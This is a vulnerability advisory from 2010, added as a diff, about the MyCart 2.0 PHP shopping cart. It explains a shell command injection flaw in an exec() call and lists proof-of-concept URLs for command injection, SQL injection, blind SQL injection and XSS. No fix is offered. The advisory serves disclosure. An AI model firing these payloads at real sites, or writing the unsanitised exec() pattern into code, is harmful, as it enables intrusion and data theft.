@@ -1,0 +1,151 @@
+MyCart 2.0 Multiple Remote Vulnerabilities
+
+ Name              MyCart
+ Vendor            http://open.appideas.com
+ Versions Affected 2.0
+
+ Author            Salvatore Fresta aka Drosophila
+ Website           http://www.salvatorefresta.net
+ Contact           salvatorefresta [at] gmail [dot] com
+ Date              2010-10-27
+
+X. INDEX
+
+ I.    ABOUT THE APPLICATION
+ II.   DESCRIPTION
+ III.  ANALYSIS
+ IV.   SAMPLE CODE
+ V.    FIX
+ 
+
+I. ABOUT THE APPLICATION
+________________________
+
+MyCart  is  a  collection  of  PHP scripts that setup the
+backbone of a shopping cart or on-line ordering system.
+
+
+II. DESCRIPTION
+_______________
+
+Many parameters are not properly sanitised  before  being
+used in SQL queries and from some PHP's functions.
+
+
+III. ANALYSIS
+_____________
+
+Summary:
+
+ A) Multiple Remote Command Execution
+ B) Multiple SQL Injection
+ C) Multiple Blind SQL Injection
+ D) XSS
+ 
+
+A) Multiple Remote Command Execution
+____________________________________
+
+Reading  the  README  file you  may  notice the following
+lines:
+
+If you can't make anything work, change the require(...)
+statement in the files of the admin directory to read:
+require("../Cart.php");
+
+In   the   "admin"   directory  there  is  a  file  named
+uploadItem.php with the following content:
+
+<?
+require("Cart.php");
+Root();
+exec("mv $image '$WebRoot/images/".$ItemID.".jpg'");
+Header("Location: $Relative/admin/index.php");
+?>
+
+Changing  require("Cart.php")  in  require("../Cart.php")
+is possibile to execute remote commands by injecting them
+using the $image variable.
+
+The   same   security    flaw   is   present    also   in
+removeItemResponse.php and  in removeCategoryResponse.php
+via SQL Injection.
+
+Successful exploitation requires that register_globlas is
+set to Off.
+
+For removeCategoryResponse.php,  successful  exploitation
+requires that magic_quotes_gpc is set to Off.
+
+
+B) Multiple SQL Injection
+_________________________
+
+Many  parameters  are not properly sanitised before being
+used in SQL queries.  This can be exploited to manipulate
+SQL queries by injecting arbitrary SQL code.
+
+Successful exploitation requires that magic_quotes_gpc is
+set to Off.
+
+
+C) Multiple Blind SQL Injection
+_______________________________
+
+Many  parameters  are not properly sanitised before being
+used in SQL queries.  This can be exploited to manipulate
+SQL queries by injecting arbitrary SQL code.
+
+Successful exploitation requires that magic_quotes_gpc is
+set to Off.
+
+
+D) XSS
+______
+
+Input passed to the "ON" parameter in receipt.php is  not
+properly sanitised before being returned to the user.This 
+can be exploited  to  execute arbitrary  HTML  and script
+code in a users browser session in context of an affected
+site.
+
+
+IV. SAMPLE CODE
+_______________
+
+A) Multiple Remote Command Execution
+
+http://site/path/admin/uploadItem.php?image=.;  ;
+http://site/path/admin/removeItemResponse.php?ItemID=.; ping localhost ;
+http://site/path/admin/removeCategoryResponse.php?CategoryID=-1' UNION SELECT '; ping localhost ;'%23
+
+
+B) Multiple SQL Injection
+
+http://site/path/description.php?II=-1' UNION SELECT 1,2,3,4,5,6,7%23&UID=VALID UID HERE
+http://site/path/receipt.php?BI=' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19%23
+http://site/path/admin/searchReceiptsResponse?criteria=order&OrderNumber=-1' UNION SELECT 1,2,3,4,5,6%23
+http://site/path/admin/searchReceiptsResponse?criteria=name&User=%25' UNION SELECT 1,2,3,4,5,6%23
+http://site/path/admin/searchReceiptsResponse?Year=%25' UNION SELECT 1,2,3,4,5,6%23
+http://site/path/admin/searchReceiptsResponse?Month=%25' UNION SELECT 1,2,3,4,5,6%23
+http://site/path/admin/searchReceiptsResponse?Day=%25' UNION SELECT 1,2,3,4,5,6%23
+
+
+C) Multiple Blind SQL Injection
+
+http://site/path/index.php?UID=' OR (SELECT(IF(0x41=0x41, BENCHMARK(999999999.,NULL),NULL)))%23
+http://site/path/removeItem.php?CartItemsID=-1' OR (SELECT(IF(0x41=0x41, BENCHMARK(999999999.,NULL),NULL)))%23
+http://site/path/removeItemResponse?ItemID=-1' OR (SELECT(IF(0x41=0x41, BENCHMARK(999999999.,NULL),NULL)))%23
+http://site/path/admin/removeCategoryResponse.php?CategoryID=-1' OR (SELECT(IF(0x41=0x41, BENCHMARK(999999999.,NULL),NULL)))%23
+
+
+D) XSS
+
+http://site/path/receipt.php?ON=<script>alert('xss');</script>
+
+
+V. FIX
+______
+
+No fix.
+
